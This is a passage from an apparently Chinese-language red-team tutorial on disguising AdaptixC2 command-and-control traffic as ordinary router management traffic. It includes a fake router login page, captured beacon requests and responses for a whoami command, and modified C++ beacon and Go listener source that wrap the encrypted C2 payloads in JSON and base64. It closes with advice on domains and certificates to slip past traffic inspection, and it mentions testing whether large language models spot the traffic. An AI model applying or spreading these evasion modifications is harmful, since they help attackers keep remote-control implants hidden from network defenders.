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') -441px -68px no-repeat; display:inline-block; height:13px; margin-left:7px; vertical-align:middle; width:13px}
        #loginError {color:#fff; font-size:12px; line-height:16px; margin-left:7px; vertical-align:middle; display:inline-block}
        li.lgBtn {margin-bottom:8px}
        li.lgBtn input {font-size:14px; padding-top:6px; padding-bottom:6px; *padding-top:5px; *padding-bottom:3px; width:300px}
        li.loginHelp {font-size:12px; margin-bottom:55px}
        span.loginHelp {color:#fff; cursor:pointer; text-decoration:underline}
        #loginFeg {background:#4a6ca0; border-radius:3px; color:white; margin-top:13px; position:relative; visibility:hidden; width:300px}
        #loginFeg p {line-height:20px; padding:12px; text-indent:0; word-break:break-all; word-wrap:break-word}
        #loginFeg i {height:0; line-height:0; width:0; top:-9px; left:15px; position:absolute; border-style:solid; border-color:#5e85bf #5E85Bf #4a6ca0 #5E85BF; border-width:0 9px 9px 9px}
        #Cover p {padding:0; text-align:center; color:#fff; font-weight:bold; font-size:16px}
        img.loginBgF {height:41px; position:absolute; top:45px; right:-92px; width:92px}
        img.loginBgS {position:absolute; top:95px; left:-63px; height:32px; width:66px}
        img.loginBgT {position:absolute; height:57px; width:136px; top:105px; left:0}
        img.loginBgFi {position:absolute; top:250px; right:30px; height:40px; width:94px}
        img.loginBgSi {position:absolute; top:460px; left:190px; height:40px; width:94px}
        label.proName {font-size:12px; color:#fff; top:21px; right:10px; position:absolute}
    </style>
</div>
<script type="text/javascript">
function showError() {
    var errorLabel = document.getElementById('lgPwdNote'); 
    errorLabel.style.visibility = 'visible';
    var label = document.getElementById('loginError');
    label.innerText = '用户名或密码错误，请重新输入。';
}
window.onload = function() {
    const usrInput = document.getElementById('lgUsr');
    const pwdInput = document.getElementById('lgPwd');
    const usrTip = document.getElementById('usrTipStr');
    const pwdTip = document.getElementById('pwdTipStr');

    function toggleTip(input, tip) {
        if (input.value) {
            tip.style.display = 'none';
        } else {
            tip.style.display = 'block';
        }
    }

    usrInput.addEventListener('focus', () => usrTip.style.display = 'none');
    usrInput.addEventListener('blur', () => toggleTip(usrInput, usrTip));
    pwdInput.addEventListener('focus', () => pwdTip.style.display = 'none');
    pwdInput.addEventListener('blur', () => toggleTip(pwdInput, pwdTip));

    toggleTip(usrInput, usrTip);
    toggleTip(pwdInput, pwdTip);
};
</script>
</body>
</html>
```

创建好**Listener**后 看看效果，与一般路由器访问无二，输入账户密码是固定返回用户名或密码错误增加迷惑性

![image.png](images/img_18820_024.png)

![image-20250911213701907.png](images/img_18820_025.png)

使用这个**Listener**生成**Agent**上线看看流量

![image.png](images/img_18820_026.png)

下发一个whoami命令看看流量

![image.png](images/img_18820_027.png)

第一个包 下发命令

```
POST /stok=CjADI3WO2g2SYoKWG7H2YA5EIhY/ds HTTP/1.1
Accept: */*
Cookie: i68CXJG0nGGQ3PR5yj2nOU74/mFTOpBAyXWaJMNN6JpQEqHA/rAu1ZWQxO4uhD1EDK8zBPdu+VTUtJJHA4S+L89lLMFg2edTRP5aZGnR9eVrUD3Zge97PNle8SaQqgLTRcTWg6Ser9/mTt2gqSXZzglV19BbOQx4Lw==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Host: 192.168.176.130
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache


HTTP/1.1 200 OK
Date: Thu, 11 Sep 2025 13:40:30 GMT
Content-Length: 1169
Content-Type: text/plain; charset=utf-8

{"wireless":{"wlan_host_2g":{"enable":"1","ssid":"CS24","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"9","bandwidth":"2","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"},"wlan_host_5g":{"enable":"1","ssid":"CS5","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"10","bandwidth":"0","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"}},"guest_network":{"guest_2g":{"ssid":"CMCC%2DGUEST%2D6kak","encrypt":"0","key":"","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"},"guest_5g":{"ssid":"CMCC%2DGUEST%2D6kak%2D5G","encrypt":"0","key":".*'J".......P.>_..l.Rh..Y'.J...w.s....N....._'...U.F.W.3...","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"}},"custom_wireless":{"wifi_switch":{"enable":"on","enable_2g":"on","enable_5g":"on","enable_5g1":"on","enable_5g4":"on"}},"error_code":0}
```

第二个包 确认命令

```
POST /stok=CjADI3WO2g2SYoKWG7H2YA5EIhY/ds HTTP/1.1
Accept: */*
Cookie: i68CXJG0nGGQ3PR5yj2nOU74/mFTOpBAyXWaJMNN6JpQEqHA/rAu1ZWQxO4uhD1EDK8zBPdu+VTUtJJHA4S+L89lLMFg2edTRP5aZGnR9eVrUD3Zge97PNle8SaQqgLTRcTWg6Ser9/mTt2gqSXZzglV19BbOQx4Lw==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Host: 192.168.176.130
Content-Length: 59
Connection: Keep-Alive
Cache-Control: no-cache

.*'qh.......P.=...V.#B+.a9.r'.._.g..........Qm.......V.....
HTTP/1.1 200 OK
Date: Thu, 11 Sep 2025 13:40:30 GMT
Content-Length: 1110
Content-Type: text/plain; charset=utf-8

{"wireless":{"wlan_host_2g":{"enable":"1","ssid":"CS24","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"9","bandwidth":"2","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"},"wlan_host_5g":{"enable":"1","ssid":"CS5","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"10","bandwidth":"0","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"}},"guest_network":{"guest_2g":{"ssid":"CMCC%2DGUEST%2D6kak","encrypt":"0","key":"","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"},"guest_5g":{"ssid":"CMCC%2DGUEST%2D6kak%2D5G","encrypt":"0","key":"","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"}},"custom_wireless":{"wifi_switch":{"enable":"on","enable_2g":"on","enable_5g":"on","enable_5g1":"on","enable_5g4":"on"}},"error_code":0}
```

第三个包 命令结果

```
POST /stok=CjADI3WO2g2SYoKWG7H2YA5EIhY/ds HTTP/1.1
Accept: */*
Cookie: i68CXJG0nGGQ3PR5yj2nOU74/mFTOpBAyXWaJMNN6JpQEqHA/rAu1ZWQxO4uhD1EDK8zBPdu+VTUtJJHA4S+L89lLMFg2edTRP5aZGnR9eVrUD3Zge97PNle8SaQqgLTRcTWg6Ser9/mTt2gqSXZzglV19BbOQx4Lw==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Host: 192.168.176.130
Content-Length: 57
Connection: Keep-Alive
Cache-Control: no-cache

.*'sh.....N.Q.>_..3.nu~..;X/~..e......J......z...5.uh>kVn
HTTP/1.1 200 OK
Date: Thu, 11 Sep 2025 13:40:38 GMT
Content-Length: 1110
Content-Type: text/plain; charset=utf-8

{"wireless":{"wlan_host_2g":{"enable":"1","ssid":"CS24","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"9","bandwidth":"2","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"},"wlan_host_5g":{"enable":"1","ssid":"CS5","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"10","bandwidth":"0","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"}},"guest_network":{"guest_2g":{"ssid":"CMCC%2DGUEST%2D6kak","encrypt":"0","key":"","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"},"guest_5g":{"ssid":"CMCC%2DGUEST%2D6kak%2D5G","encrypt":"0","key":"","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"}},"custom_wireless":{"wifi_switch":{"enable":"on","enable_2g":"on","enable_5g":"on","enable_5g1":"on","enable_5g4":"on"}},"error_code":0}
```

这里使用主流的大模型检测是否能识别C2流量（结果仅供参考）

![image.png](images/img_18820_028.png)

![image.png](images/img_18820_029.png)

![image.png](images/img_18820_030.png)

到这里还不算完，不知道大家发现没有，响应体有如下构造

```
{"status": "ok", "data": "<<<PAYLOAD_DATA>>>", "metrics": "sync"}
```

而请求体是裸奔的，加密后的数据直接附在请求体上，现在对源码进行魔改让请求体也支持json格式请求

```
.*'qh.......P.=...V.#B+.a9.r'.._.g..........Qm.......V.....
```

初步构想，给请求体套个json+base64，这里需要将服务端和客户端同步进行修改

```
{"browser_type":"Chrome","queryWord": "<<<Base64后的原Data>>>","extend1":"connect"}
```

这里直接讲如何修改，以HTTP Beacon为例子

filename：AdaptixC2-main\_v0.8\Extenders\agent\_beacon\src\_beacon\beacon\ConnectorHTTP.cpp

```
// 将请求体包装成JSON格式来避免流量审查
LPSTR base64_data = b64_encode(data, data_size);
if (base64_data) {
    DWORD base64_len = _strlen(base64_data);

    // 构建JSON格式: {"browser_type":"Chrome","queryWord":"<base64_data>","extend1":"connect"}
    CHAR json_prefix[] = "{"browser_type":"Chrome","queryWord":"";
    CHAR json_suffix[] = "","extend1":"connect"}";

    DWORD json_prefix_len = sizeof(json_prefix) - 1;  // 减去null终止符
    DWORD json_suffix_len = sizeof(json_suffix) - 1;
    DWORD json_total_size = json_prefix_len + base64_len + json_suffix_len;

    BYTE* json_data = (BYTE*)this->functions->LocalAlloc(LPTR, json_total_size);
    if (json_data) {
        // 构建完整的JSON字符串
        memcpy(json_data, json_prefix, json_prefix_len);
        memcpy(json_data + json_prefix_len, base64_data, base64_len);
        memcpy(json_data + json_prefix_len + base64_len, json_suffix, json_suffix_len);

        connected = this->functions->HttpSendRequestA(hRequest, this->headers, (DWORD)_strlen(headers), (LPVOID)json_data, json_total_size);

        // 清理分配的内存
        memset(json_data, 0, json_total_size);
        this->functions->LocalFree(json_data);
    } else {
        // JSON内存分配失败时使用原始数据
        connected = this->functions->HttpSendRequestA(hRequest, this->headers, (DWORD)_strlen(headers), (LPVOID)data, (DWORD)data_size);
    }

    // 清理base64数据
    memset(base64_data, 0, base64_len);
    this->functions->LocalFree(base64_data);
} else {
    // base64编码失败时使用原始数据
    connected = this->functions->HttpSendRequestA(hRequest, this->headers, (DWORD)_strlen(headers), (LPVOID)data, (DWORD)data_size);
}
```

filename：AdaptixC2-main\_v0.8\Extenders\listener\_beacon\_http\pl\_http.go

```
// 期望格式: {"browser_type":"Chrome","queryWord":"<base64_data>","extend1":"connect"}
bodyStr := string(bodyData)

// 检查是否是JSON格式
if len(bodyStr) > 0 && bodyStr[0] == '{' && bodyStr[len(bodyStr)-1] == '}' {
    // 查找queryWord字段
    queryWordStart := strings.Index(bodyStr, ""queryWord":"")
    if queryWordStart != -1 {
        queryWordStart += len(""queryWord":"")
        queryWordEnd := strings.Index(bodyStr[queryWordStart:], """)
        if queryWordEnd != -1 {
            base64Data := bodyStr[queryWordStart : queryWordStart+queryWordEnd]
            // 解码Base64数据
            decodedData, err := base64.StdEncoding.DecodeString(base64Data)
            if err == nil {
                bodyData = decodedData
            }
        }
    }
}
```

改完重新make一下

![image.png](images/img_18820_031.png)

重新生成Agent丢虚拟机跑起看看

![image.png](images/img_18820_032.png)

从服务端下发一个命令看看流量

![image.png](images/img_18820_033.png)

第一个包 下发命令

```
POST /stok=CjADI3WO2g2SYoKWG7H2YA5EIhY/ds HTTP/1.1
Accept: */*
Cookie: 1lgjAHBWFaQfh5uRkua8eeMxrRMxfMJXodQAc9sWmVoKr6mjoZEC14++Xnmfgtp6hG9KDC7+07dM0Gu8H1XZxhGGBgDxfrD+idAe4SupZ4w7EeseVvwMtT+64RizPPisZTiJ8NmiRRoQTRxKLoJVJH/x6BRZdyOQ6Q==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Host: 192.168.176.130
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache


HTTP/1.1 200 OK
Date: Thu, 11 Sep 2025 16:59:54 GMT
Content-Length: 1169
Content-Type: text/plain; charset=utf-8

{"wireless":{"wlan_host_2g":{"enable":"1","ssid":"CS24","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"9","bandwidth":"2","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"},"wlan_host_5g":{"enable":"1","ssid":"CS5","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"10","bandwidth":"0","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"}},"guest_network":{"guest_2g":{"ssid":"CMCC%2DGUEST%2D6kak","encrypt":"0","key":"","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"},"guest_5g":{"ssid":"CMCC%2DGUEST%2D6kak%2D5G","encrypt":"0","key":".f#.5..=...[.?....G......^o..#Q3j.,2.mT;...E.@....4.a..g..w","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"}},"custom_wireless":{"wifi_switch":{"enable":"on","enable_2g":"on","enable_5g":"on","enable_5g1":"on","enable_5g4":"on"}},"error_code":0}
```

第二个包 确认命令

```
POST /stok=CjADI3WO2g2SYoKWG7H2YA5EIhY/ds HTTP/1.1
Accept: */*
Cookie: 1lgjAHBWFaQfh5uRkua8eeMxrRMxfMJXodQAc9sWmVoKr6mjoZEC14++Xnmfgtp6hG9KDC7+07dM0Gu8H1XZxhGGBgDxfrD+idAe4SupZ4w7EeseVvwMtT+64RizPPisZTiJ8NmiRRoQTRxKLoJVJH/x6BRZdyOQ6Q==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Host: 192.168.176.130
Content-Length: 140
Connection: Keep-Alive
Cache-Control: no-cache

{"browser_type":"Chrome","queryWord":"wWYjwxyBO6CC0c1w7Rmx0hqzfVd37eiJO0ByryEtURtcDGx0OWMKbZ2VwEQPCpC1eVs4zXvC5psxlHU=","extend1":"connect"}

HTTP/1.1 200 OK
Date: Thu, 11 Sep 2025 16:59:54 GMT
Content-Length: 1110
Content-Type: text/plain; charset=utf-8

{"wireless":{"wlan_host_2g":{"enable":"1","ssid":"CS24","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"9","bandwidth":"2","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"},"wlan_host_5g":{"enable":"1","ssid":"CS5","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"10","bandwidth":"0","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"}},"guest_network":{"guest_2g":{"ssid":"CMCC%2DGUEST%2D6kak","encrypt":"0","key":"","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"},"guest_5g":{"ssid":"CMCC%2DGUEST%2D6kak%2D5G","encrypt":"0","key":"","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"}},"custom_wireless":{"wifi_switch":{"enable":"on","enable_2g":"on","enable_5g":"on","enable_5g1":"on","enable_5g4":"on"}},"error_code":0}
```

第三个包 命令结果

```
POST /stok=CjADI3WO2g2SYoKWG7H2YA5EIhY/ds HTTP/1.1
Accept: */*
Cookie: 1lgjAHBWFaQfh5uRkua8eeMxrRMxfMJXodQAc9sWmVoKr6mjoZEC14++Xnmfgtp6hG9KDC7+07dM0Gu8H1XZxhGGBgDxfrD+idAe4SupZ4w7EeseVvwMtT+64RizPPisZTiJ8NmiRRoQTRxKLoJVJH/x6BRZdyOQ6Q==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Host: 192.168.176.130
Content-Length: 136
Connection: Keep-Alive
Cache-Control: no-cache

{"browser_type":"Chrome","queryWord":"wWYjwRyBO6CC0Uls7Bm+ngTXGCQ62r2lQUIt8ng+UiFTFHttNWBQLLWEzFROHeXaWwaQcAyqDc1e","extend1":"connect"}

HTTP/1.1 200 OK
Date: Thu, 11 Sep 2025 16:59:58 GMT
Content-Length: 1110
Content-Type: text/plain; charset=utf-8

{"wireless":{"wlan_host_2g":{"enable":"1","ssid":"CS24","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"9","bandwidth":"2","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"},"wlan_host_5g":{"enable":"1","ssid":"CS5","ssidbrd":"1","encryption":"1","key":"88888888","channel":"0","mode":"10","bandwidth":"0","power":"0","isolate":"0","turboon":"0","auth":"0","cipher":"1","twt":"0","ofdma":"0","max_sta_num":"0"}},"guest_network":{"guest_2g":{"ssid":"CMCC%2DGUEST%2D6kak","encrypt":"0","key":"","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"},"guest_5g":{"ssid":"CMCC%2DGUEST%2D6kak%2D5G","encrypt":"0","key":"","enable":"0","accright":"0","upload":"0","download":"0","time_limit":"0","limit_type":"timeout","duration":"0","ssidbrd":"1","auth":"0","cipher":"1","max_sta_num":"0"}},"custom_wireless":{"wifi_switch":{"enable":"on","enable_2g":"on","enable_5g":"on","enable_5g1":"on","enable_5g4":"on"}},"error_code":0}
```

可以看到流量层面已经伪装成正常业务流量（路由器），由于C2是开源的，所以后面其实可拓展性很大，包括比如说请求头URL弄成动态的，响应体也变成动态的json格式，更贴合实际业务流量，最后套上域名弄上证书就可以规避很多流量审查

![image.png](images/img_18820_034.png)
